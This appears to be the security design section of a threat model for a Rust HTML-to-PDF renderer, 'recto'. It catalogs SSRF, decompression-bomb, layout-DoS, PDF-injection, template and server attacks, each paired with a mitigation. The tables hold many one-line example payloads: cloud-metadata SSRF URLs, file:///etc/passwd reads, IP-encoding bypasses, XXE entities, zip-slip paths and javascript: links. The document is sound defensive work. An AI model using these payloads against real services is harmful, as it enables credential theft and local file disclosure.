- **Default string resolver reads arbitrary files**: `ImageHrefResolver::default_string_resolver` (`parser/image.rs:85-114`) does `opts.get_abs_path(href)` then `std::fs::read(&path)` — no root confinement, follows symlinks, accepts absolute paths (`<image href="/etc/shadow">` is then rejected only by format sniffing; but `<image href="/home/u/secret.png">` is embedded). recto **must** replace `image_href_resolver.resolve_string` with a resolver that routes through recto's fetcher/policy, and set `resources_dir: None`.
- Nested SVG images: `Tree::from_data_nested` (`parser/mod.rs:124-155`) disables external string hrefs (`resolve_string: Box::new(|_, _| None)`) but keeps the data resolver → `data:` SVG within `data:` SVG nesting is bounded only by input size (each level base64-inflates 4/3, so ≤ ~40 levels for 1 MB). This is exactly the dompdf CVE-2026-56722 shape — safe here only because nested external hrefs are dropped; recto's replacement resolver must keep that property (pass a "nested" flag, deny non-data URLs at depth>0, cap nesting depth at 4).

### 4.4 image 0.25.10 / png 0.18.1 decoding limits
- `image::Limits` (`src/io/limits.rs:35-42`): `max_image_width: Option<u32>`, `max_image_height: Option<u32>`, `max_alloc: Option<u64>`; `Default` (`:49-54`) = no width/height limit, `max_alloc: Some(512 * 1024 * 1024)`. 512 MiB per image is too much for recto; set explicitly.
- `png::Limits` (`src/decoder/mod.rs:65-87`): `bytes: usize`, default `1024 * 1024 * 64` (64 MiB).
- Dimension bombs: PNG IHDR can declare 2³¹×2³¹; a 100×100 KB PNG of zeros can declare 50000×50000 (2.5 Gpx ≈ 10 GB RGBA). Check header dimensions before decode.

### 4.5 Rust runtime facts (rust-lang/rust `library/`)
- Allocation failure: `handle_alloc_error` docs (`library/alloc/src/alloc.rs:639-663`): with `std`, default is "print a message to standard error and **abort the process**"; replaceable only via `set_alloc_error_hook`, which is `#[unstable(feature = "alloc_error_hook", issue = "51245")]` (`library/std/src/alloc.rs:358-359`). On stable, **OOM = process abort**. A global allocator returning null therefore cannot be turned into a recoverable per-job error.
- `catch_unwind` (`library/std/src/panic.rs` doc "Notes"): catches only unwinding panics; with `panic = "abort"` nothing is caught. recto's release profile must keep `panic = "unwind"` for the library/server (CLI may abort).
- Stack overflow: guard page → SIGSEGV handler → abort; not a panic (confirmed by RUSTSEC-2026-0187 text: "stack-overflow abort rather than a `panic!`, it cannot be caught with `catch_unwind`").
- `std::thread::Builder::stack_size` exists (`library/std/src/thread/builder.rs:130`) → run each job on a dedicated thread with a known stack (e.g. 16–64 MiB) so depth caps can be computed against a known budget.

### 4.6 Linux sandboxing crates
- **seccompiler 0.5.0** (`Cargo.toml` deps: `libc ^0.2.153` only; serde/serde_json optional). API: `SeccompFilter::new` (`src/backend/filter.rs:85`), `SeccompAction` (`src/backend/mod.rs:155`), `apply_filter` (`src/lib.rs:312`), `apply_filter_all_threads` (`src/lib.rs:324`, TSYNC), `compile_from_json` (`src/lib.rs:389`, feature `json`). Arches: `TargetArch::{x86_64, aarch64, riscv64}` (`src/backend/mod.rs:95-107`). musl: tests contain `#[cfg(target_env = "musl")]` shims (`tests/integration_tests.rs:18-22`) → builds and is tested on musl. Pure BPF generation, no libseccomp C dependency → static-binary friendly.
- **landlock 0.4.7** (deps: enumflags2, libc 0.2.186, thiserror 2). Raw syscalls via `libc::syscall(SYS_landlock_create_ruleset|add_rule|restrict_self, …)` (`src/uapi/mod.rs:68-86`) → no C library dependency; works with static musl provided the `libc` crate defines the `SYS_landlock_*` numbers for the musl target (**UNVERIFIED**, very likely since they are Linux syscall numbers, not libc functions). ABI levels `V1`(Linux 5.13) … `V9`(Linux 7.1) (`src/compat.rs:52-81`). Network rules `AccessNet::{BindTcp, ConnectTcp}` (`src/net.rs:45-49`, ABI V4, Linux 6.7). Scopes `Scope::{AbstractUnixSocket, Signal}` (`src/scope.rs:39-44`, ABI V6). `Ruleset::create` (`src/ruleset.rs:249`), `RulesetCreated::restrict_self` (`src/ruleset.rs:971`), `path_beneath_rules` (`src/fs.rs:607`). `CompatLevel::{BestEffort, SoftRequirement, HardRequirement}` (`src/compat.rs:505-513`) → degrade gracefully on old kernels.
- Both apply to the **whole process/thread**, irreversible → only usable in (a) the CLI after reading inputs, or (b) a worker subprocess. Not usable from the library inside a host application.

---

## 5. Attack catalog

Legend for **Default**: ✔ = blocked/limited by default; ⚙ = configurable; `N` = numeric default from §7.

### 5.1 Fetch surface (SSRF / local file read)

All of these produce a fetch. recto enumerates them in one place (`ResourceKind` enum) and routes every one through `Fetcher::fetch(kind, url, ctx) -> Result<Bytes, FetchError>`. The fetcher is constructed from `Policy` and is not `Default`-constructible.

| # | Vector | Example payload | Affected tools / CVEs | recto mitigation | Default |
|---|---|---|---|---|---|
| F1 | `<img src>`, `srcset`, `<picture><source srcset>` | `<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` | wkhtmltopdf CVE-2022-35583; ReportLab CVE-2020-28463; all Chrome services | Network off; when on: scheme/host allowlist + resolved-IP denylist | ✔ network off |
| F2 | `<iframe>`, `<object>`, `<embed>`, `<frame>` | `<iframe src="file:///etc/passwd">` | wkhtmltopdf CVE-2020-21365; Prince CVE-2018-19858 | **Not supported at all** in v1 (render as empty box, emit warning `W_UNSUPPORTED_EMBED`). No nested browsing contexts → no fetch. | ✔ |
| F3 | `<link rel=stylesheet>`, `@import` (transitive) | `@import url("http://10.0.0.5:6379/")` | WeasyPrint CVE-2026-55073 | Same fetcher; `@import` depth ≤ 8 and cycle detection (URL set) | ✔ |
| F4 | `@font-face src: url()` / `local()` | `@font-face{font-family:x;src:url(file:///proc/self/environ)}` | dompdf CVE-2022-28368 (RCE), CVE-2022-41343, CVE-2026-55555 (oracle) | Same fetcher; font bytes never written to disk; `local()` resolves only against recto's font DB (system fonts off by default — see §7) | ✔ |
| F5 | CSS `url()` in any property: `background-image`, `list-style-image`, `border-image-source`, `content: url()`, `cursor`, `mask-image`, `image-set()`, `filter: url()`, `shape-outside` | `li{list-style-image:url(http://internal/)}` | WeasyPrint CVE-2026-49452 | Parse-time: every `<url>`/`<image>` value becomes `ResolvedUrl` via one function; properties recto does not render (cursor) are never fetched | ✔ |
| F6 | Presentational attributes → CSS | `<body background="x);background-image:url(http://169.254.169.254/)">`, `<table background=…>` | WeasyPrint CVE-2026-49452 | Map hints to typed values; never string-build CSS | ✔ |
| F7 | SVG `<image href>`, `xlink:href`, `<use href="ext.svg#a">`, `<feImage>`, `<pattern href>`, CSS inside SVG `<style>` with `@import`/`url()` | `<svg><IMAGE xlink:href="file:///etc/hosts"/></svg>` | dompdf CVE-2023-23924, CVE-2023-24813, CVE-2026-56722, CVE-2021-3902 | Replace usvg `ImageHrefResolver::resolve_string` with recto fetcher; external `<use>` not supported (usvg resolves only in-document ids via `id_map`); SVG `<style>` `@import`: **UNVERIFIED** whether usvg's simplecss path fetches anything — assume not, test it | ✔ |
| F8 | `<a rel=attachment href>` / attachments / `<link rel=attachment>` | `<a rel="attachment" href="file:///home/app/.env">x</a>` | WeasyPrint CVE-2024-28184; mPDF CVE-2022-50897 (`<annotation file=…>`) | Attachments feature **off by default** (`--allow-attachments`); when on, goes through the same fetcher and size caps | ✔ |
| F9 | API-level resources: user stylesheets, XMP packet path, ICC profile path, PDF/A output intent, base URL | `render(html, stylesheets=["file:///etc/passwd"])` | WeasyPrint CVE-2026-55073; knp-snappy CVE-2026-46683 (`xsl-style-sheet`) | Same fetcher, but kind `Trusted*` may be granted extra roots by the *caller*, never by the document | ⚙ |
| F10 | Redirects to internal hosts | `302 Location: http://127.0.0.1:5000/secret` | WeasyPrint CVE-2025-68616; Gotenberg CVE-2026-42595; pdfmake CVE-2025-11362 (loop) | Disable client auto-redirect; follow manually ≤ 3 hops, re-run full policy each hop (scheme, host, port, resolved IP); cross-scheme downgrade https→http forbidden | ✔ |
| F11 | DNS rebinding | `rebind.attacker.tld` A=1.2.3.4 TTL 0, then 127.0.0.1 | Gotenberg CVE-2026-42592 | Resolve once, validate all addresses, **connect to the validated IP** (pin), send `Host:`/SNI from the name. Never let the HTTP client resolve again. Custom resolver hook in the HTTP client: **UNVERIFIED** for ureq 3.4.2 / reqwest 0.13.5 API names — verify before choosing client. | ✔ |
| F12 | IP encodings | `http://2130706433/`, `http://0x7f.1/`, `http://0177.0.0.1/`, `http://[::ffff:127.0.0.1]/`, `http://[::ffff:7f00:1]/`, `http://[2002:a9fe:a9fe::]/` (6to4 of 169.254.169.254), `http://[64:ff9b::a9fe:a9fe]/` (NAT64), `http://127.1/`, `http://0/` | Gotenberg CVE-2026-42596, CVE-2026-45741 | Check the **resolved `IpAddr`** (not the string) against the CIDR denylist (§7.3), after canonicalizing IPv4-mapped/compat/6to4/NAT64/Teredo to the embedded IPv4 and checking both | ✔ |
| F13 | Scheme tricks | `FILE:///etc/passwd`, `file:/etc/passwd`, `file://localhost/etc/passwd`, ` file:///` (leading space), `view-source:`, `jar:`, `ftp:`, `gopher://127.0.0.1:6379/_SET…`, `dict:`, `phar://`, `blob:`, `javascript:` | Browsershot ×7; Gotenberg CVE-2026-27018/40280; dompdf phar | Parse with a WHATWG URL parser (lowercases scheme, strips C0/space), then **allowlist** schemes: `data`, and when enabled `file`, `http`, `https`. Everything else → `E_SCHEME_DENIED` | ✔ |
| F14 | Port abuse (when network on) | `http://public-host:25/`, `:6379` | generic SSRF | Optional port allowlist; default {80, 443} | ✔ |
| F15 | `file://` path traversal | `<img src="../../../../etc/passwd">`, `%2e%2e/`, `..%2f`, `file:///input/dir/../../etc` | dompdf CVE-2014-2383, CVE-2022-2400; Browsershot CVE-2024-21547, CVE-2025-1022 | Percent-decode via URL parser, then `canonicalize` (realpath) and require **path-component** prefix match (`Path::starts_with`, not string prefix — dompdf CVE-2026-55554) against allowed roots | ✔ |
| F16 | Symlink escape / TOCTOU | `assets/logo.png -> /etc/shadow`; swap file between check and open | — | Open via `openat2(RESOLVE_BENEATH | RESOLVE_NO_MAGICLINKS)` from a root dirfd where available (Linux ≥5.6; via rustix — **UNVERIFIED** API name `rustix::fs::openat2`); fallback: canonicalize + open + `fstat` compare dev/ino with the canonical path's `stat`; deny symlinks pointing outside roots by default (`--follow-symlinks-outside` off) | ✔ |
| F17 | Special files | `file:///dev/zero`, `/dev/urandom`, `/proc/self/fd/0`, FIFO (blocks forever), `/proc/self/environ`, `/sys/...` | — | Require `S_ISREG` on the opened fd; read with byte cap; deny `/proc`, `/sys`, `/dev` roots even if inside an allowed root | ✔ |
| F18 | File-existence oracles | timing/error differences (dompdf CVE-2026-55555, CVE-2026-59943) | dompdf | Out-of-policy URLs fail with the same error code *before* any filesystem/network touch; in `strict` mode errors abort the job (no partial rendering that differs); never echo absolute paths in errors returned over HTTP | ✔ |
| F19 | Windows UNC / NTLM leak (if Windows build) | `file://attacker/share/x.png`, `\\attacker\x` | generic | Reject `file:` URLs with non-empty, non-`localhost` host | ✔ |
| F20 | Proxy env leakage | `HTTPS_PROXY` honored implicitly | — | Ignore proxy env vars unless `--proxy` given | ✔ |
| F21 | `data:` URI | `data:image/svg+xml;base64,…` nested SVG referencing local files | dompdf CVE-2026-56722 | data: always allowed but counted against byte budgets; SVG from data: is "nested" (no external hrefs) | ✔ |

### 5.2 Decompression and parse bombs

| # | Vector | Example | Affected | recto mitigation | Default |
|---|---|---|---|---|---|
| B1 | data-URI size | 100 MB base64 in `src` | — | Input HTML size cap; single data URI ≤ `max_resource_bytes` | ✔ |
| B2 | PNG/zlib bomb | 50 KB IDAT inflating to GBs; or IHDR 65535×65535 | dompdf CVE-2026-59942 | Header pre-check pixels ≤ `max_image_pixels`; `png::Limits.bytes` and `image::Limits{max_image_width,max_image_height,max_alloc}` set explicitly | ✔ |
| B3 | Image dimension bomb (declared) | BMP/GIF header 30000×30000 | jsPDF CVE-2026-25535/24133; dompdf CVE-2026-59941 | Same pixel cap computed from header before allocation; prefer pass-through of JPEG bytes into PDF (DCTDecode) without full decode — the PDF viewer decodes; recto only parses SOF for dimensions | ✔ |
| B4 | Many moderately sized images | 2000 × 4 Mpx images | — | Cumulative decoded-pixel budget per job (`max_total_image_pixels`); identical-URL dedupe via content hash | ✔ |
| B5 | WOFF2 / brotli bomb | WOFF2 with `totalSfntSize` 4 GB, brotli 1000:1 | CVE-2025-6176 (brotli DoS), rustls brotli 1 GiB | Reject if declared `totalSfntSize` > `max_font_bytes`; decompress with a `Read::take(max+1)` cap; also WOFF1 zlib tables | ✔ |
| B6 | SVGZ / gzip HTTP Content-Encoding | 1 MB → 1 GB gzip | usvg `decompress_svgz` unbounded | Decompress ourselves with cap; disable usvg `svgz` feature; HTTP: request `Accept-Encoding: identity` or cap decoded stream | ✔ |
| B7 | XML billion laughs in SVG | `<!ENTITY lol9 "&lol8;…">` | Prince, PDFreactor, dompdf XXE (external); librsvg UAF | roxmltree loop detector (≤10 depth, ≤255 refs/root ref) + recto cap on SVG text bytes and node count before `usvg` conversion; optionally reject any SVG with DTD (`allow_dtd: false` via own `roxmltree` parse then `Tree::from_xmltree`) — **recommended default: reject DTD** (SVGs in documents virtually never need entities) | ✔ |
| B8 | XXE (external entity) | `<!ENTITY x SYSTEM "file:///etc/passwd">` | Prince CVE-2018-19858, dompdf CVE-2021-3902, PDFreactor | roxmltree has no resolver by default → discarded; recto never passes `entity_resolver` | ✔ |
| B9 | HTML entity expansion | — | — | Impossible (fixed table, §4.1) | n/a |
| B10 | Quadratic XML attrs | 80k attributes on one tag | quick-xml RUSTSEC-2026-0194 | Don't use quick-xml < 0.41 on untrusted input; cap attributes per element in HTML sink (`max_attributes_per_element` 1024) | ✔ |

### 5.3 Layout / algorithmic DoS

| # | Vector | Example | recto mitigation | Default |
|---|---|---|---|---|
| L1 | Deep DOM → stack overflow in recursive style/layout/drop | `"<div>"*1_000_000` (2 MB of input) | DOM sink rejects depth > `max_dom_depth` (512) with `E_LIMIT_DOM_DEPTH`; or (lenient mode) flattens extra depth into parent like Blink. Layout runs on a dedicated thread with known stack (e.g. 32 MiB); iterative `Drop` for the DOM arena (arena + indices → no recursive drop). CI test: max depth × worst per-frame stack < stack size. Option: `stacker::maybe_grow` (0.1.25) at recursion points as a belt-and-braces. | ✔ |
| L2 | Node count / text size | 10M `<span>` | `max_dom_nodes` (500k), `max_input_bytes` | ✔ |
| L3 | Inline nesting quadratic (misnested formatting → Noah's ark) | `<b><i><u>…` × 10k unclosed | html5ever bounded adoption agency; plus node cap | ✔ |
| L4 | Selector complexity | 10k rules × `:is(:is(:is(...)))` or `:has()` (not supported) or `*:nth-child(…)` on 500k nodes | Cap stylesheet bytes, rules (`max_css_rules` 50k), selector nesting depth (32 — cssparser/selectors has its own nesting limits: **UNVERIFIED**), compound count; cascade work budget (selector-match operations counter checked in loop) | ✔ |
| L5 | CSS parser nesting | `[[[[[[...` / `((((((` 100k deep in a value | cssparser block nesting: **UNVERIFIED** whether recursive; enforce `max_css_nesting` 64 in recto's own parsing layer, rejecting stylesheet | ✔ |
| L6 | `var()` / custom property explosion | `--a:x x x x; --b:var(--a) var(--a) var(--a) var(--a); …` 30 levels → 4³⁰ tokens | Spec allows UA to treat long substitutions as invalid ("guaranteed-invalid"); cap substituted token count per value (`max_var_expansion_tokens` 64k) and `var()` depth | ✔ |
| L7 | counters / `content` explosion | `*::before{content:counters(c,"…………")}` with 512-deep nested `counter-reset` | Cap generated-content string length per box (64 KiB), counter nesting depth (bounded by DOM depth) | ✔ |
| L8 | Huge page counts | 1e6 × `<div style="break-before:page">` (≈30 MB HTML) or `height: 1e9px` box | `max_pages` (10,000 default); abort when exceeded with `E_LIMIT_PAGES` (streaming output stops; partial output discarded unless `--allow-partial`) | ✔ |
| L9 | Huge coordinates/sizes | `width: 1e30px`, `font-size: 1e9px`, `letter-spacing: 1e9px`, `@page{size:1e9px}`, `column-count: 1e9`, `colspan=1e6`, `rowspan` | Clamp lengths to app-unit range (i32 1/60px as Servo, ≈±17.9M px); `column-count` ≤ 1000 (CSS doesn't cap; Blink caps at 1000 — **UNVERIFIED**); HTML `colspan` ≤ 1000, `rowspan` ≤ 65534 (HTML spec clamps — **UNVERIFIED** values from memory, check spec); `@page` size ≤ PDF max 14,400 pt (PDF 1.7 implementation limit 200 in. — **UNVERIFIED**) | ✔ |
| L10 | Infinite layout loops: `target-counter()` / page-number feedback | TOC entry whose page number width pushes content onto next page, changing the number back (oscillation between 99↔100) | Fixed-point iteration capped at `max_layout_passes` (default 4); if not converged, use last pass's values and emit `W_LAYOUT_NOT_CONVERGED` (deterministic, since passes are deterministic) | ✔ |
| L11 | Pathological fragmentation (table rows, orphans/widows, floats) | Float with `clear` chains causing O(n²) re-layout | Global work counter ("fuel") decremented in layout loops; `E_LIMIT_WORK` when exhausted — makes the time cap deterministic (see §6.4) | ✔ |
| L12 | Font fallback storms | 100k distinct code points from 500 different `@font-face` families | `max_fonts` (64 web fonts), `max_font_bytes` per font, fallback cache, glyph-count cap per job | ✔ |
| L13 | Shaping pathologies | Very long single word (no break opportunities) 10 MB; complex-script mark stacks (`a` + 10k combining marks) | Cap text run length passed to shaper (shape in ≤64 KiB chunks at cluster boundaries); cap combining marks per cluster (HarfBuzz uses `HB_MAX_CONTEXT_LENGTH`/buffer limits — check harfrust equivalents: **UNVERIFIED**) | ✔ |
| L14 | ReDoS | regexes in recto (e.g. color/length parsing, template engine, `--allow-host` patterns) | No backtracking regex in hot paths; if regex needed use `regex` crate (linear-time); host allowlist as exact/suffix match, not user-supplied regex (Gotenberg CVE-2026-35458) | ✔ |
| L15 | Malicious font parse crashes | TTF with overlapping tables, huge `maxp.numGlyphs`, cyclic composite glyphs, CFF charstring recursion, `glyf` composite depth | skrifa/read-fonts (OSS-Fuzz, forbid unsafe); composite depth limits inside skrifa (**UNVERIFIED** exact constant); recto: per-job `catch_unwind`, font byte cap, validate sfnt table directory before use; subsetter must also be fuzzed | ✔ |
| L16 | SVG rendering cost | 1e6-node SVG, filters with huge blur radius, `feTurbulence` at 10k×10k | Recto cap SVG nodes (50k) < usvg's 1e6; filters rasterized at capped resolution or emitted as vector; cap raster filter area to `max_image_pixels` | ✔ |

### 5.4 Output-side (PDF integrity) attacks

| # | Vector | Example | Affected | recto mitigation | Default |
|---|---|---|---|---|---|
| P1 | PDF string injection via metadata | `<title>x) /JS (app.alert(1)) /Foo (</title>`, `<meta name=author>` | jsPDF CVE-2026-25940/24737/25755/31898 | Writer always emits text strings as UTF-16BE **hex strings** `<FEFF…>` or escapes `\ ( )` and CR/LF; name objects escape `#xx`; one serializer, no `format!` into PDF syntax; fuzz writer round-trip with a PDF parser | ✔ |
| P2 | XMP injection | `<title>]]&gt;</rdf:li>…</title>` | jsPDF CVE-2026-24043 | XML-escape all XMP values (`& < > " '`), strip C0 controls invalid in XML 1.0 | ✔ |
| P3 | Link annotations with dangerous URIs | `<a href="javascript:app.launchURL(...)">`, `file:///c:/windows/system32/calc.exe`, `smb://`, `vbscript:` | jsPDF injection family; generic phishing | Allowlist link schemes: `http`, `https`, `mailto`, `tel`, internal `#frag` (→ GoTo). Others: drop the annotation, keep text, warn `W_LINK_SCHEME_DROPPED`. Never emit `/JavaScript`, `/JS`, `/Launch`, `/SubmitForm`, `/ImportData`, `/GoToR`, `/GoToE`, `/AA`, `/OpenAction` with JS, `/RichMedia`. Grep the writer for these names in CI. | ✔ |
| P4 | Arbitrary embedded files | `<a rel=attachment>` | WeasyPrint CVE-2024-28184 | Off by default (F8) | ✔ |
| P5 | Fingerprinting | `/Producer (HeadlessChrome 65)` used to pick exploits | Chrome services | `/Producer` = `recto` without patch version by default (`--producer` to override); deterministic output anyway | ⚙ |
| P6 | Data exfil via output to third party | rendering secrets fetched by SSRF into the PDF | all | Covered by fetch policy | ✔ |

### 5.5 Template / data-mode attacks

| # | Vector | Example | Mitigation | Default |
|---|---|---|---|---|
| T1 | Markup injection from JSON data | `{"name": "<img src=http://169.254.169.254/…>"}` | Template engine **HTML-escapes by default** (`& < > " '`, also `` ` `` and `=` in attribute context); raw output requires explicit `{{{ }}}`/`|safe` *in the template* (trusted), never from data | ✔ |
| T2 | Attribute-context injection | `<a href="{{url}}">` with `javascript:…`; `<div style="{{s}}">` with `x;background:url(http://…)` | Escaping does not prevent scheme/CSS injection; rely on fetch policy (F5) and link-scheme allowlist (P3); document "never put data in `style`/`href` unvalidated"; optional `url` filter that drops non-http(s) | ✔ |
| T3 | Template-language code execution / SSTI | Jinja-style `{{ ''.__class__ }}`, md-to-pdf front-matter JS (CVE-2025-65108), ReportLab `eval` (CVE-2023-33733) | Logic-less (Mustache-like) engine; no expression evaluation, no filters that touch filesystem/env, no includes outside template root, no recursion beyond partial depth 16 | ✔ |
| T4 | Template DoS | Partial recursion `{{> a}}` inside `a`; JSON with 1e6-element arrays × nested sections → output explosion | Partial depth cap; **output-size cap** for rendered HTML (`max_input_bytes` applies after templating); JSON parse depth cap (serde_json default recursion limit 128 — **UNVERIFIED** constant) and JSON size cap | ✔ |
| T5 | Zip-slip in template asset bundles | zip entry `../../etc/cron.d/x`, `..\..\x` (Gotenberg CVE-2026-44829), absolute paths, symlink entries | **Never extract to disk.** Read bundle into an in-memory VFS keyed by normalized relative path; reject entries with `..`, absolute, backslash, drive letters, NUL, symlink type; cap entry count, per-entry and total uncompressed size, compression ratio | ✔ |

### 5.6 Server-mode attacks (`recto serve`)

| # | Vector | Mitigation | Default |
|---|---|---|---|
| S1 | Huge request body | `max_request_bytes` (32 MiB) enforced while streaming, before buffering; multipart part count/size caps | ✔ |
| S2 | Slowloris / slow body | Header read timeout 10 s, body read timeout 30 s, minimum body rate, idle keep-alive 30 s; max connections (1024) | ✔ |
| S3 | Concurrency exhaustion | Bounded job queue (`queue_depth` = 2×workers); `503` + `Retry-After` when full; per-client concurrency limit optional | ✔ |
| S4 | Expensive-but-valid jobs | All §7 limits apply per job; server may lower but clients may only *lower* limits in requests, never raise | ✔ |
| S5 | Multi-tenant isolation | No shared temp dirs: inputs held in memory per request; no `file://` in server mode by default (only explicitly configured asset roots, read-only); fonts/caches shared only if content-addressed and immutable; worker processes recycled after N jobs or on any limit breach | ✔ |
| S6 | Temp-file races | Prefer no temp files. If needed: `O_TMPFILE` / `tempfile` with `O_EXCL`, mode 0600, in a per-job dir created with `mkdtemp`, never predictable names; never reuse paths across requests (Gotenberg CVE-2026-42597) | ✔ |
| S7 | Unauthenticated exposure | Bind `127.0.0.1` by default; `--listen 0.0.0.0` requires explicit flag; optional bearer token; no webhooks / `downloadFrom` features (the Gotenberg CVE magnets) in v1 | ✔ |
| S8 | HTTP parser bugs | Current hyper 1.x; HTTP/2 off by default (h2 DoS advisories); request smuggling irrelevant without a proxy chain but keep strict parsing | ✔ |
| S9 | Error-message leakage | Errors over HTTP return code + sanitized message; no absolute paths, no internal hostnames, no fetched content excerpts | ✔ |
| S10 | Log injection | Escape control chars in logged URLs/titles | ✔ |
| S11 | Header injection | recto sets `Content-Disposition` filename from user input? → RFC 6266 `filename*` encoding, strip CR/LF | ✔ |

---

## 6. Rust-specific robustness design

### 6.1 Panics
- Every job (CLI render, library `render()`, server request) runs inside `std::panic::catch_unwind(AssertUnwindSafe(|| …))` on its own thread; panic → `E_INTERNAL_PANIC` with the panic message hashed/trimmed (no input echo). Library API never panics across its boundary.
- Release profile: `panic = "unwind"` for lib/server (required, §4.5). A custom panic hook suppresses default stderr printing in library mode (host apps dislike stray stderr) and records location for the error.
- After a caught panic, the job's arena/allocations are dropped; global caches (font DB, glyph cache) must be either immutable or poison-tolerant (`Mutex` poisoning → rebuild cache).
- `#![deny(clippy::unwrap_used, clippy::indexing_slicing)]` in parsers of untrusted binary formats (font subsetter, image header sniffers, PDF writer) — *lint names from memory, **UNVERIFIED** exact clippy names `unwrap_used`/`indexing_slicing`*.
- `overflow-checks = true` in release for parsing crates? Trade-off: turns silent wrap into panic (caught). Recommend enabling for recto's own crates (cost is low) — decision for perf research.

### 6.2 Unbounded recursion
Not catchable (§4.5). Rules:
1. Every recursive algorithm over the DOM/box tree/CSS values/SVG tree is bounded by an explicit depth cap enforced at construction time (`max_dom_depth` 512, box tree depth ≤ DOM depth + small constant for anonymous boxes, CSS nesting 64, SVG depth via usvg's 1024 → recto pre-check 256, `@import` 8, nested SVG-in-image 4, template partials 16).
2. Jobs run on a thread spawned with `thread::Builder::new().stack_size(STACK)` (`library/std/src/thread/builder.rs:130`), `STACK` = 64 MiB virtual (only touched pages are committed). A CI test renders the max-depth document under ASan-free release build and asserts headroom ≥ 2×.
3. Arena-allocated trees with index links; `Drop` is a flat `Vec` drop (no recursive `Box` chains).

### 6.3 Memory: per-job accounting
Facts: OOM aborts the process on stable (§4.5); `set_alloc_error_hook` unstable. So:

- **Layer 1 — pre-allocation validation (primary):** every size derived from input is checked against budgets *before* allocating: image pixels from headers, font `totalSfntSize`, decompression output via `Read::take`, `Vec::try_reserve` for input-derived buffers, glyph/node/page counts. This makes 95% of memory bombs fail with a typed error.
- **Layer 2 — counting global allocator with per-job budget (cooperative):** a `#[global_allocator]` wrapper (around the system allocator or mimalloc/jemalloc — choice in perf research) that increments a thread-local "current job" counter (`Cell<isize>` per worker thread; jobs are single-threaded or use a job-scoped counter `Arc<AtomicIsize>` installed in each helper thread's TLS). The allocator **never returns null on budget breach** (that would abort); it sets a "budget exceeded" flag. Layout/parse loops poll the flag at checkpoints (each node, each line, each page) and bail with `E_LIMIT_MEMORY`. Overshoot is bounded by the largest single allocation between checkpoints, which Layer 1 already bounds. Off-the-shelf: `cap` 0.1.2 (global limit, returns null → abort; not suitable as-is), `stats_alloc` 0.1.10 (global counters only). Recommend a ~100-line in-house allocator wrapper. Determinism: counted bytes depend on allocator-independent `Layout::size()` sums → deterministic for a given binary/input, so `E_LIMIT_MEMORY` is reproducible.
- **Layer 3 — process hard cap (server mode / `--isolate`):** worker subprocesses with `setrlimit(RLIMIT_AS)` (or `RLIMIT_DATA`) via `rlimit` 0.11.0 / `rustix` 1.1.5, and/or cgroup v2 `memory.max` when run under systemd/k8s. An abort in a worker kills only that worker; supervisor maps signal/exit to `E_WORKER_CRASHED` and respawns.

### 6.4 Time
- Wall-clock deadline per job (`timeout`), checked cooperatively at the same checkpoints as memory; network fetch timeouts (connect 5 s, total per resource 10 s, total fetch phase 30 s).
- Wall-clock limits are **non-deterministic**. For reproducible failures add a deterministic **work budget ("fuel")**: counters for selector matches, layout iterations, shaping calls, pages. Exceeding fuel → `E_LIMIT_WORK` (deterministic); wall-clock is the backstop → `E_TIMEOUT`.
- In-process wall-clock cannot preempt a stuck non-cooperative loop inside a dependency (e.g. a quadratic loop in a parser crate). Only a subprocess with `SIGKILL` (or `RLIMIT_CPU`) is a hard guarantee → worker pool in server mode.

### 6.5 `unsafe` in dependencies
- Policy: prefer crates with `#![forbid(unsafe_code)]` for untrusted-input parsing (verified: skrifa, read-fonts, ttf-parser). For others (html5ever/tendril, image decoders, miniz_oxide, brotli-decompressor, tiny-skia SIMD) — track with `cargo-geiger` (**UNVERIFIED** current maintenance) and `cargo-deny` + `cargo-audit` against rustsec in CI; deny `yanked`, deny RUSTSEC unmaintained for direct deps (would flag ttf-parser/rustybuzz).
- No C dependencies (also required for static `scratch` builds): no libpng/zlib-sys/freetype/harfbuzz-sys/brotli-sys/libseccomp.
- Fuzz recto's own parsers (HTML sink, CSS, font subsetter, image sniffers, PDF writer round-trip, template engine, URL policy) with `cargo-fuzz`; target OSS-Fuzz once public.

### 6.6 Sandboxing (Linux, defense in depth)
Order of application in a worker / CLI after inputs are known:
1. `prctl(PR_SET_NO_NEW_PRIVS)` (landlock crate's `prctl.rs`; also required for unprivileged seccomp).
2. **Landlock** (`landlock` 0.4.7, `CompatLevel::BestEffort`): read-only `path_beneath_rules` for allowed roots (input dir, font dirs, asset roots); write only to output path's dir (CLI) or nothing (worker, which returns bytes over a pipe); `AccessNet::ConnectTcp` only on ports 80/443 if network enabled else none (ABI ≥ V4); `Scope::{AbstractUnixSocket, Signal}` (ABI ≥ V6). Note: Landlock cannot filter by destination IP — IP policy remains in-process.
3. **seccomp** (`seccompiler` 0.5.0, `apply_filter_all_threads`): allowlist of syscalls needed after init (read, write, mmap/munmap/mremap/brk, madvise, futex, clock_gettime, exit_group, sigaltstack, rt_sigreturn, openat (if file access), fstat/statx, close, lseek, getrandom, sched_yield; plus socket/connect/poll/recvfrom/sendto when network is on); default action `KillProcess` (worker) or `Errno(EPERM)` (CLI, friendlier). x86_64 + aarch64 only.
4. Both are optional (`--sandbox=auto|off|strict`): `auto` = best-effort, silently skip on non-Linux/old kernels and in library mode; `strict` = fail if unavailable. Default for CLI: `auto`; for server workers: `auto` + log the achieved ABI level at startup.

Static musl: seccompiler's only dependency is `libc` and it has musl test shims (§4.6); landlock uses raw syscalls via `libc`. Both expected to work in a static musl `scratch` image (**UNVERIFIED** by an actual build — environment cannot fetch crates).

### 6.7 Process isolation for server mode
- Supervisor process (HTTP, no rendering) + pool of N worker processes (the same binary, `recto __worker` hidden subcommand, spawned via `std::process::Command` with cleared env, `RLIMIT_AS`, `RLIMIT_CPU`, `RLIMIT_NOFILE`, landlock+seccomp applied at worker start before reading any job).
- IPC: length-prefixed frames over stdin/stdout pipes (job = HTML/template+JSON+limits; result = PDF bytes or error code). Workers have no listening sockets and no access to other jobs' data.
- Recycle worker after `max_jobs_per_worker` (e.g. 100) or immediately after any `E_LIMIT_*`/panic, to bound heap fragmentation and residual state.
- Kill on deadline (`SIGKILL` at `timeout + grace`). Map: exit by signal 9 after deadline → `E_TIMEOUT`; SIGABRT/SIGSEGV → `E_WORKER_CRASHED` (stack overflow/OOM); SIGSYS → `E_SANDBOX_VIOLATION`.
- Network fetches (if enabled) happen **in the worker** under the same IP policy; optionally move fetching to the supervisor to keep workers network-less (stronger: worker seccomp forbids `socket`). Recommended: supervisor-side fetch broker for server mode (worker requests URL via IPC; supervisor applies policy and returns bytes). This also makes fetch caching across workers possible.
